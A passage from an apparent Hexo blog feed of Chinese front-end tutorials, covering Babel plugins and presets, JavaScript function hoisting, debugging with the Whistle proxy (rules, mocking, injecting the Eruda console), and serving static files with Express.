<p>不要将基础结构数据（例如有关组件渲染周期，<code>setTimeout()</code>或<code>setInterval()</code>）存储到状态中。经验法则是将此类数据保存在 Ref 中。</p>
<p>最后，别忘了清除你的副作用。</p>
<hr>
<blockquote>
<p>作者：Shadeed    来源：dmitripavlutin原文：<a href="https://dmitripavlutin.com/react-hooks-mistakes-to-avoid/">https://dmitripavlutin.com/react-hooks-mistakes-to-avoid/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>关于BABEL</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%85%B3%E4%BA%8EBABEL/</url>
    <content><![CDATA[<h2 id="什么是-BABEL"><a href="#什么是-BABEL" class="headerlink" title="什么是 BABEL"></a>什么是 BABEL</h2><blockquote>
<p>Babel 官方文档: <a href="https://babeljs.io/">https://babeljs.io/</a></p>
</blockquote>
<p>我们知道各个浏览器对 JavaScript 版本的支持各不相同，有很多优秀的新语法都不能直接在浏览器中运行。为了解决这个“沟通不畅”的问题，所以就有了 Babel，Babel 的出现使得我们可以无须顾忌的去使用 ES6+ 的语法。</p>
<blockquote>
<p>Babel is a JavaScript compiler.</p>
</blockquote>
<p>这也是为何我们必须使用 ES6+ 语法的前提条件。</p>
<h2 id="BABEL-如何编译"><a href="#BABEL-如何编译" class="headerlink" title="BABEL 如何编译"></a>BABEL 如何编译</h2><p>先看下面这张图：<img src="https://upload-images.jianshu.io/upload_images/10024246-d39f2e8ae58b73a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>你会发现 ES6 的语法确实被编译成浏览器可以识别的版本了，你是不是也在问这是怎么做到的呢？</p>
<h3 id="BABEL-编译的阶段"><a href="#BABEL-编译的阶段" class="headerlink" title="BABEL 编译的阶段"></a>BABEL 编译的阶段</h3><blockquote>
<p>babel 总共分为三个阶段：解析，转换，生成。</p>
</blockquote>
<p>我们需要知道现在 babel 本身是不具备这种转化功能，提供这些转化功能的是一个个 plugin。所以我们没有配置任何 plugin 的时候，经过 Babel 输出的代码是没有改变的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5e8ec00624dcbc19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="640?wx_fmt=png"></p>
<h3 id="PLUGIN-——-TRANSFORM-的载体"><a href="#PLUGIN-——-TRANSFORM-的载体" class="headerlink" title="PLUGIN —— TRANSFORM 的载体"></a>PLUGIN —— TRANSFORM 的载体</h3><blockquote>
<p>Babel 自 6.0 起，就不再对代码进行转换。现在只负责图中的 parse 和 generate 流程，转换代码的 transform 过程全都交给插件去做。</p>
</blockquote>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 模板字面量	</span><br><span class="line">const name &#x3D; &#39;小生方勤&#39;;	</span><br><span class="line">let hello &#x3D; &#96;hello $&#123;name&#125;&#96;;</span><br></pre></td></tr></table></figure>

<p>上面是一个简单的模板字面量的例子，我们清楚这个是 ES6 的新特性，在不支持 ES6 的运行平台这段代码是会报错的，所以我们需要 Babel 来将其编译成 ES5 的代码。</p>
<p>所以我们需要如下来配置 babel：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .babelrc 文件	</span><br><span class="line">&#123; 	</span><br><span class="line">  &quot;plugins&quot;: [	</span><br><span class="line">    &quot;transform-es2015-template-literals&quot;  &#x2F;&#x2F; 转译模版字符串的 plugins	</span><br><span class="line">  ],	</span><br><span class="line">  &quot;presets&quot;: [&quot;env&quot;, &quot;stage-2&quot;]	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>preset（即一组预先设定的插件）</strong></p>
<blockquote>
<p>preset: babel 插件集合的预设，包含某些插件 plugin。显然像上面那样一个一个配置插件会非常的麻烦，为了方便，babel 为我们提供了一个配置项叫做 persets（预设）。</p>
</blockquote>
<p>当前 babel 推荐使用 babel-preset-env 替代 babel-preset-es201X ,env 的支持范围更广，包含es201X 的所有语法编译，并且它可以根据项目运行平台的支持情况自行选择编译版本。</p>
<h4 id="PLUGINS-与-PRESETS-同时存在的执行顺序"><a href="#PLUGINS-与-PRESETS-同时存在的执行顺序" class="headerlink" title="PLUGINS 与 PRESETS 同时存在的执行顺序"></a>PLUGINS 与 PRESETS 同时存在的执行顺序</h4><ol>
<li><p> 先执行 plugins 的配置项,再执行 Preset 的配置项；</p>
</li>
<li><p> plugins 配置项，按照声明顺序执行；</p>
</li>
<li><p> Preset 配置项，按照声明逆序执行。</p>
</li>
</ol>
<p>列入以下代码的执行顺序为：</p>
<ol>
<li><p> transform-es2015-template-literals</p>
</li>
<li><p> stage-2</p>
</li>
<li><p> env</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .babelrc 文件	</span><br><span class="line">&#123; 	</span><br><span class="line">    &quot;plugins&quot;: [	</span><br><span class="line">        &quot;transform-es2015-template-literals&quot;,  &#x2F;&#x2F; 转译模版字符串的 plugins	</span><br><span class="line">    ],	</span><br><span class="line">    &quot;presets&quot;: [	</span><br><span class="line">        [&quot;env&quot;, &#123;	</span><br><span class="line">            &#x2F;&#x2F; 是否自动引入 polyfill，开启此选项必须保证已经安装了 babel-polyfill	</span><br><span class="line">            &#x2F;&#x2F; “usage” | “entry” | false, defaults to false.	</span><br><span class="line">            &quot;useBuiltIns&quot;: &quot;usage&quot;	</span><br><span class="line">        &#125;], &quot;stage-2&quot;]	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里讲一讲 useBuiltIns 配置</strong></p>
<p>我们可能在全局引入 babel-polyfill，这样打包后的整个文件体积必然是会变大的。</p>
<p>但是通过设置 <code>&quot;useBuiltIns&quot;:&quot;usage&quot;</code> 能够把 babel-polyfill 中你需要用到的部分提取出来，不需要的去除。</p>
<p><strong>useBuiltIns 参数说明：</strong></p>
<ol>
<li><p> false: 不对 polyfills 做任何操作</p>
</li>
<li><p> entry: 根据 target 中浏览器版本的支持，将 polyfills 拆分引入，仅引入有浏览器不支持的 polyfill</p>
</li>
<li><p> usage(新)：检测代码中 ES6/7/8 等的使用情况，仅仅加载代码中用到的 polyfills</p>
</li>
</ol>
<h2 id="BABEL-相关模块简要说明"><a href="#BABEL-相关模块简要说明" class="headerlink" title="BABEL 相关模块简要说明"></a>BABEL 相关模块简要说明</h2><p>了解过 Babel 的同学，是否也觉得的模块有点多呢？我开始学习的时候就有这种感觉。其实每个模块是各司其职的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-15ad7a0856c930aa.JPEG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h3 id="BABEL-CORE（核心）"><a href="#BABEL-CORE（核心）" class="headerlink" title="BABEL-CORE（核心）"></a>BABEL-CORE（核心）</h3><p>这个模块是最能顾名思义的了，即 babel 的核心模块。babel 的核心 api 都在这个模块中。也就是这个模块会把我们写的 js 代码抽象成 AST 树；然后再将 plugins 转译好的内容解析为 js 代码。</p>
<p>具体怎么工作的这里就不详细说了，因为我也不知道。</p>
<h3 id="BABEL-CLI"><a href="#BABEL-CLI" class="headerlink" title="BABEL-CLI"></a>BABEL-CLI</h3><blockquote>
<p>babel-cli 官方文档：<a href="https://babeljs.io/docs/en/babel-cli/">https://babeljs.io/docs/en/babel-cli/</a></p>
</blockquote>
<p>babel-cli 是一个通过命令行对 js 文件进行转换的工具。</p>
<p>当然我们一般不会使用到这个模块，因为一般我们都不会手动去做这个工作，这个工作基本都集成到模块化管理工具中去了，比如 webpack、Rollup 等。</p>
<p>简单使用（需要先安装 babel-cli）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">babel test.js -o compiled.js</span><br></pre></td></tr></table></figure>

<h3 id="BABEL-NODE"><a href="#BABEL-NODE" class="headerlink" title="BABEL-NODE"></a>BABEL-NODE</h3><p>babel-node 是 babel-cli 的一部分，所以它在安装 babel-cli 的时候也同时安装了。</p>
<p>它使 ES6+ 可以直接运行在 node 环境中。</p>
<h3 id="BABEL-POLYFILL-内部集成了-CORE-JS-和-REGENERATOR"><a href="#BABEL-POLYFILL-内部集成了-CORE-JS-和-REGENERATOR" class="headerlink" title="BABEL-POLYFILL(内部集成了 CORE-JS 和 REGENERATOR)"></a>BABEL-POLYFILL(内部集成了 CORE-JS 和 REGENERATOR)</h3><p>babel 对一些新的 API 是无法转换，比如 Generator、Set、Proxy、Promise 等全局对象，以及新增的一些方法：includes、Array.form 等。所以这个时候就需要一些工具来为浏览器做这个兼容。</p>
<blockquote>
<p>官网的定义：babel-polyfill 是为了模拟一个完整的 ES6+ 环境，旨在用于应用程序而不是库/工具。</p>
</blockquote>
<p><strong>babel-polyfill 主要有两个缺点：</strong></p>
<ol>
<li><p> 使用 babel-polyfill 会导致打出来的包非常大，很多其实没有用到，对资源来说是一种浪费。</p>
</li>
<li><p> babel-polyfill 可能会污染全局变量，给很多类的原型链上都作了修改，这就有不可控的因素存在。</p>
</li>
</ol>
<p>因为上面两个问题，所以在 Babel7 中增加了 babel-preset-env，我们设置 <code>&quot;useBuiltIns&quot;:&quot;usage&quot;</code>这个参数值就可以实现按需加载 babel-polyfill 啦。</p>
<h3 id="BABEL-RUNTIME-amp-BABEL-PLUGIN-TRANSFORM-RUNTIME"><a href="#BABEL-RUNTIME-amp-BABEL-PLUGIN-TRANSFORM-RUNTIME" class="headerlink" title="BABEL-RUNTIME &amp; BABEL-PLUGIN-TRANSFORM-RUNTIME"></a>BABEL-RUNTIME &amp; BABEL-PLUGIN-TRANSFORM-RUNTIME</h3><blockquote>
<p>在使用 Babel6 的时候， .babelrc 文件中会使用 babel-plugin-transform-runtime，而 package.json 中的 dependencies 同时包含了 babel-runtime，因为在使用 babel-plugin-transform-runtime 的时候必须把 babel-runtime 当做依赖。</p>
</blockquote>
<p>.babelrc 配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;	</span><br><span class="line">  &quot;presets&quot;: [	</span><br><span class="line">    [&quot;env&quot;]	</span><br><span class="line">  ],	</span><br><span class="line">  &quot;plugins&quot;: [	</span><br><span class="line">    [&quot;transform-runtime&quot;, &#123;	</span><br><span class="line">      &quot;helpers&quot;: false, &#x2F;&#x2F; defaults to true	</span><br><span class="line">      &quot;polyfill&quot;: false, &#x2F;&#x2F; defaults to true	</span><br><span class="line">      &quot;regenerator&quot;: true, &#x2F;&#x2F; defaults to true	</span><br><span class="line">      &quot;moduleName&quot;: &quot;babel-runtime&quot; &#x2F;&#x2F; defaults to &quot;babel-runtime&quot;	</span><br><span class="line">    &#125;]	</span><br><span class="line">  ]	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在启用插件 babel-plugin-transform-runtime 后，Babel 就会使用 babel-runtime 下的工具函数，将一些浏览器不能支持的特性重写，然后在项目中使用。</p>
<blockquote>
<p>babel-runtime 内部也集成了 core-js、 regenerator、helpers 等</p>
</blockquote>
<p>由于采用了沙盒机制，这种做法不会污染全局变量，也不会去修改内建类的原型，所以会有重复引用的问题。</p>
<p>现在最好的实践应该是在 babel-preset-env 设置 “useBuiltIns”: “usage”，按需引入 polyfill。</p>
<h3 id="三种方案对比"><a href="#三种方案对比" class="headerlink" title="三种方案对比"></a>三种方案对比</h3><table>
<thead>
<tr>
<th>方案</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>@babel/runtime &amp; @babel/plugin-transform-runtime</td>
<td>按需引入, 打包体积小</td>
<td>不能兼容实例方法</td>
</tr>
<tr>
<td>@babel/polyfill</td>
<td>完整模拟 ES2015+ 环境</td>
<td>打包体积过大, 污染全局对象和内置的对象原型</td>
</tr>
<tr>
<td>@babel/preset-env</td>
<td>按需引入, 可配置性高</td>
<td>小生不知 -_-</td>
</tr>
</tbody></table>
<h2 id="BABEL7-的一些变化"><a href="#BABEL7-的一些变化" class="headerlink" title="BABEL7 的一些变化"></a>BABEL7 的一些变化</h2><h3 id="PRESET-的变更："><a href="#PRESET-的变更：" class="headerlink" title="PRESET 的变更："></a>PRESET 的变更：</h3><blockquote>
<p>淘汰 es201x，删除 stage-x，推荐 env</p>
</blockquote>
<p>如果你还在使用 es201x，官方建议使用 env 进行替换。<strong>淘汰并不是删除，只是不推荐使用</strong>。</p>
<p>但 stage-x 是直接被删了，也就是说在 babel7 中使用 es201X 是会报错的。</p>
<h3 id="包名称变化"><a href="#包名称变化" class="headerlink" title="包名称变化"></a>包名称变化</h3><p>babel 7 的一个重大变化，把所有 babel-* 重命名为 @babel/*，</p>
<p>例如：</p>
<ol>
<li><p> babel-cli —&gt; @babel/cli。</p>
</li>
<li><p> babel-preset-env —&gt; @babel/preset-env</p>
</li>
</ol>
<h3 id="低版本-NODE-不再支持"><a href="#低版本-NODE-不再支持" class="headerlink" title="低版本 NODE 不再支持"></a>低版本 NODE 不再支持</h3><p>babel 7.0 开始不再支持 nodejs 0.10, 0.12, 4, 5 这四个版本，相当于要求 nodejs &gt;= 6。</p>
<p>还有一些包从其他包独立出来的变化等等</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>函数声明与表达式</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>函数是JavaScript中的一等对象，这意味着可以把函数像其它值一样传递。 一个常见的用法是把<em>匿名函数</em>作为回调函数传递到异步函数中。</p>
<h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function foo() &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>上面的方法会在执行前被 <code>解析(hoisted)</code>，因此它存在于当前上下文的<em>任意</em>一个地方， 即使在函数定义体的上面被调用也是对的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo(); &#x2F;&#x2F; 正常运行，因为foo在代码运行前已经被创建</span><br><span class="line">function foo() &#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数赋值表达式"><a href="#函数赋值表达式" class="headerlink" title="函数赋值表达式"></a>函数赋值表达式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; function() &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>这个例子把一个<em>匿名</em>的函数赋值给变量 <code>foo</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo; &#x2F;&#x2F; &#39;undefined&#39;</span><br><span class="line">foo(); &#x2F;&#x2F; 出错：TypeError</span><br><span class="line">var foo &#x3D; function() &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>由于 <code>var</code> 定义了一个声明语句，对变量 <code>foo</code> 的解析是在代码运行之前，因此 <code>foo</code> 变量在代码运行时已经被定义过了。</p>
<p>但是由于赋值语句只在运行时执行，因此在相应代码执行之前， <code>foo</code> 的值缺省为 <code>undefined</code>。</p>
<h3 id="命名函数的赋值表达式"><a href="#命名函数的赋值表达式" class="headerlink" title="命名函数的赋值表达式"></a>命名函数的赋值表达式</h3><p>另外一个特殊的情况是将命名函数赋值给一个变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; function bar() &#123;    </span><br><span class="line">        bar(); &#x2F;&#x2F; 正常运行</span><br><span class="line">&#125;</span><br><span class="line">bar(); &#x2F;&#x2F; 出错：ReferenceError</span><br></pre></td></tr></table></figure>

<p><code>bar</code> 函数声明外是不可见的，这是因为我们已经把函数赋值给了 <code>foo</code>； 然而在 <code>bar</code> 内部依然可见。这是由于 JavaScript 的  <code>命名处理</code>所致， 函数名在函数内<em>总是</em>可见的。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>使用Whistle调试Web</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8Whistle%E8%B0%83%E8%AF%95Web/</url>
    <content><![CDATA[<p><a href="https://link.zhihu.com/?target=https://github.com/avwo/whistle">Whistle</a> 是一款 Web 调试工具，使用 Whistle，可以修改一个 HTTP/HTTPS 请求的方方面面，我们可以通过它 Mock 数据、修改请求延迟时间、修改静态文件等等。市面上有许多 Web 调试工具，比如在 Windows 上比较有名的 Fiddler，比如说 Charles 等等。而 Whistle 具有开源免费、配置简单、以及跨平台等特点，在使用它一段时间之后，我认为在前端开发中它完全能够代替上述的工具。下面让我们结合实际场景来看看 Whistle 能帮助我们做什么吧。</p>
<h2 id="快速起步"><a href="#快速起步" class="headerlink" title="快速起步"></a>快速起步</h2><p>在开始使用 Whistle 之前，需要安装以及进行一些配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 1\. 下载</span><br><span class="line">npm i -g whistle</span><br><span class="line"># 2\. 启动 whistle 默认监听在 8899 端口</span><br><span class="line">w2 start</span><br></pre></td></tr></table></figure>

<p>启动 Whistle 之后，我们访问 <code>localhost:8899</code> 就可以看到 Whistle 的配置界面了，如图，界面左侧有 4 个菜单项，Network 可以查看请求响应的详情。Rules 是规则配置的地方，关于规则是什么，我们放到后面讲。在 Values 中我们可以配置 key-value 数据，之后可以在 Rules 使用对应的键值进行引用。Plugins 里展示了我们额外安装的 Whistle 插件，并且可以对这些插件进行配置。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3b8f23d096a03b1c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>Whistle 的规则主要由两部分组成，pattern 和 operatorURI，Whistle 使用 pattern 对请求进行匹配，并对匹配上的请求上应用 operatorURI 定义的操作，通过不同的 operatorURI，可以做到替换请求体、响应体、响应码等等事情。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-692ec2b174912915.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>为了让我们的请求被 Whistle 代理，还需配置 HTTP 代理或者 HTTPS 代理到 Whistle，如果使用 Chrome 浏览器，推荐 <a href="https://link.zhihu.com/?target=https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN">SwitchyOmega</a> 配置代理，这样更加灵活。另外，为了能够抓取 HTTPS 协议的包，我们还需要下载<a href="https://link.zhihu.com/?target=https://wproxy.org/whistle/webui/https.html">安装并信任 Whistle 的 HTTPS 证书</a>，其中，关于 iOS 的证书配置，我之前写了一篇</p>
<p>关于 Whistle 更加详细的配置方法，请参考 Whistle 的<a href="https://link.zhihu.com/?target=https://wproxy.org/whistle/">官方文档</a>。</p>
<p>下面，让我们看看 Whistle 的一些功能。</p>
<h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">example.com localhost:8000</span><br></pre></td></tr></table></figure>

<p>通过配置这样的规则，当我们访问 <code>example.com</code> 的时候，实际请求会打到 <code>localhost:8000</code>。</p>
<p>如果我们的 API 是同源的，并且我们只想将静态资源的请求替换为本地开发中的，还可以这样配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 假设所有 API 路径为 &#x2F;api，仍然走实际地址</span><br><span class="line">example.com&#x2F;api example.com&#x2F;api</span><br><span class="line"># 其他请求到本地</span><br><span class="line">example.com localhost:8000</span><br></pre></td></tr></table></figure>

<h2 id="Mock-数据"><a href="#Mock-数据" class="headerlink" title="Mock 数据"></a>Mock 数据</h2><p>日常开发中，我们经常需要对后端接口进行 Mock，这样就不需要依赖后端实际部署情况了，或者我们需要测试一些边缘情况，Mock 这些边缘情况就可以免除为测试这样的边缘链路需要做的许多麻烦事情。最简单的 Mock 可以针对一个 pattern 替换响应体和响应码等等。如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Rules</span><br><span class="line"># 将 example.com&#x2F;api&#x2F;user 接口的响应内容替换为 user.json 中的内容，并将响应码替换成 200</span><br><span class="line"># 其中，user.json 在 Values 面板中保存</span><br><span class="line">example.com&#x2F;api&#x2F;user resBody:&#x2F;&#x2F;&#123;user.json&#125; replaceStatus:&#x2F;&#x2F;200</span><br></pre></td></tr></table></figure>

<p>我们甚至可以设定请求的响应延时，只需要再加一个 <code>resDelay</code> 的 operatorURI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 10s 后返回</span><br><span class="line">example.com&#x2F;api&#x2F;user resBody:&#x2F;&#x2F;&#123;user.json&#125; replaceStatus:&#x2F;&#x2F;200 resDelay:&#x2F;&#x2F;10000</span><br></pre></td></tr></table></figure>

<p>可能有时候会有更加复杂的 Mock 需求，比如几个接口之间互相有关联，需要跑通一个完整的链路可能需要一些定制的逻辑。Whistle 提供了很多插件，其中有一个能够提供非常强大 Mock 能力的插件——<a href="https://link.zhihu.com/?target=https://github.com/whistle-plugins/whistle.vase">whistle.vase</a>。使用这个插件，我们甚至可以直接写 JS 代码，根据我们的具体请求参数作出各种具体逻辑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i -g whistle.vase</span><br></pre></td></tr></table></figure>

<p>在安装完之后，就可以在 Plugins 中对其进行配置了。</p>
<h2 id="移动端调试"><a href="#移动端调试" class="headerlink" title="移动端调试"></a>移动端调试</h2><p>移动端最佳的调试方案应该是直接连接到桌面浏览器的调试工具，比如说移动端的 Safari 可以直接连接到 Safari 上，安卓的 Chrome 可以直接连接到 Chrome 的 DevTools 上，这种调试方法所得到的调试功能最多最强大。但是，并不是所有情况下我们都可以使用这种方式进行调试的，此时就可以使用更加通用的方法，下面介绍两种借助 Whistle 进行移动端调试的方案。</p>
<p>Whistle 自带了 <a href="https://link.zhihu.com/?target=https://github.com/nupthale/weinre">Weinre</a>，可以进行移动端远程调试，开启该功能很简单，只需在需要调试的 pattern 后面加上如下operatorURI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.zhihu.com weinre:&#x2F;&#x2F;debug</span><br></pre></td></tr></table></figure>

<p>其中 <code>debug</code> 为类别（可以自由指定名称），方便我们对各个页面进行分类，这样一来，我们在 Whislte 的应用界面的 Weinre 菜单中就可以看到 <code>debug</code> 了，点击 <code>debug</code>，在手机上打开对应的页面，就可以愉快地进行调试了。</p>
<p>另一种方案是使用移动端的调试面板（引入特定的包），目前有许多移动端的调试面板工具可以满足轻量级的调试需求，比如 <a href="https://link.zhihu.com/?target=https://github.com/Tencent/vConsole">vConsole</a>、<a href="https://link.zhihu.com/?target=https://github.com/liriliri/eruda">Eruda</a> 等等。不过，我们的代码中不一定有加载这些调试包（比如我们生产环境代码），我们可以借助 Whistle 在 HTML 响应体后面增加一段加载移动端调试面板的代码。比如说我们使用 Eruda，那么我们可以在 Values 中增加下面一段代码，取名为 load_eruda.js：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.onload &#x3D; function() &#123;</span><br><span class="line">    eruda.init();</span><br><span class="line">  &#125;;</span><br><span class="line">  script.src &#x3D; &#39;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;eruda&#39;;</span><br><span class="line">  document.body.appendChild(script);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>假设我们要调试知乎（<a href="http://www.zhihu.com/">http://www.zhihu.com</a>），利用 <code>jsAppend</code> 将这段自定义脚本加到 HTML 后方，像这样增加规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.zhihu.com jsAppend:&#x2F;&#x2F;&#123;load_eruda.js&#125;</span><br></pre></td></tr></table></figure>

<p>打开 <code>www.zhihu.com</code>，就可以看到 Eruda 的调试按钮了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是对 Whistle 的介绍，Whistle 提供了超过 60+ 个协议（operatorURI），可以满足我们平时在 Web 调试过程中各式各样的需求，可以查看 Whistle 的文档进一步探索。当然，目前 Whistle 也存在一些不足，比如现在还不支持 HTTP/2 的抓包（作者有计划支持），比如 Mock 数据如何与团队共享的问题。不过，作为一款在积极开发且功能在我看来已经比较完善的应用，非常推荐大家一试。</p>
<h2 id="附：其他类似工具"><a href="#附：其他类似工具" class="headerlink" title="附：其他类似工具"></a>附：其他类似工具</h2><ol>
<li> <a href="https://link.zhihu.com/?target=https://www.wireshark.org/">Wireshark</a> - 网络数据包分析软件，网络协议栈的各个层的数据都可以很方便地查看。</li>
<li> <a href="https://link.zhihu.com/?target=https://termshark.io/">Termshark</a> - 「终端版」的 Wireshark</li>
<li> <a href="https://link.zhihu.com/?target=https://www.charlesproxy.com/">Charles</a> - 一款老牌 HTTP/HTTPS 抓包调试工具</li>
<li> <a href="https://link.zhihu.com/?target=https://www.telerik.com/fiddler">Fiddler</a> - 又一款免费的 Web 调试工具</li>
<li> <a href="https://link.zhihu.com/?target=https://mitmproxy.org/">mitmproxy</a> - 一款开源免费的交互式的 HTTPS 代理</li>
</ol>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>利用Express托管静态文件</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%88%A9%E7%94%A8Express%E6%89%98%E7%AE%A1%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>为了提供诸如图像、CSS 文件和 JavaScript 文件之类的静态文件，请使用 Express 中的 <code>express.static</code> 内置中间件函数。</p>
<p>此函数特征如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">express.static(root, [options])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The <code>root</code> argument specifies the root directory from which to serve static assets. For more information on the <code>options</code> argument, see <a href="https://www.expressjs.com.cn/4x/api.html#express.static">express.static</a>.</p>
<p>例如，通过如下代码就可以将 <code>public</code> 目录下的图片、CSS 文件、JavaScript 文件对外开放访问了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(express.static(&#39;public&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在，你就可以访问 <code>public</code> 目录中的所有文件了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;images&#x2F;kitten.jpg</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;css&#x2F;style.css</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;js&#x2F;app.js</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;images&#x2F;bg.png</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;hello.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Express 在静态目录查找文件，因此，存放静态文件的目录名不会出现在 URL 中。</p>
<p>如果要使用多个静态资源目录，请多次调用 <code>express.static</code> 中间件函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(express.static(&#39;public&#39;))</span><br><span class="line">app.use(express.static(&#39;files&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问静态资源文件时，<code>express.static</code> 中间件函数会根据目录的添加顺序查找所需的文件。</p>
<p>注意：For best results, <a href="https://www.expressjs.com.cn/en/advanced/best-practice-performance.html#use-a-reverse-proxy">use a reverse proxy</a> cache to improve performance of serving static assets.</p>
<p>To create a virtual path prefix (where the path does not actually exist in the file system) for files that are served by the <code>express.static</code> function, <a href="https://www.expressjs.com.cn/4x/api.html#app.use">specify a mount path</a> for the static directory, as shown below:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(&#39;&#x2F;static&#39;, express.static(&#39;public&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在，你就可以通过带有 <code>/static</code> 前缀地址来访问 <code>public</code> 目录中的文件了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;static&#x2F;images&#x2F;kitten.jpg</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;static&#x2F;css&#x2F;style.css</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;static&#x2F;js&#x2F;app.js</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;static&#x2F;images&#x2F;bg.png</span><br><span class="line">http:&#x2F;&#x2F;localhost:3000&#x2F;static&#x2F;hello.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然而，the path that you provide to the <code>express.static</code> function is relative to the directory from where you launch your <code>node</code> process. If you run the express app from another directory, it’s safer to use the absolute path of the directory that you want to serve:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(&#39;&#x2F;static&#39;, express.static(path.join(__dirname, &#39;public&#39;)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>欲了解更多关于 <code>serve-static</code> 函数及其参数的知识，请参考 <a href="https://www.expressjs.com.cn/resources/middleware/serve-static.html">serve-static</a>。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>前端学习方向</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91/</url>
    <content><![CDATA[<p>最近一直在思考，个人潜在技术方向的下个关注点，看了下网上建议有以下：</p>
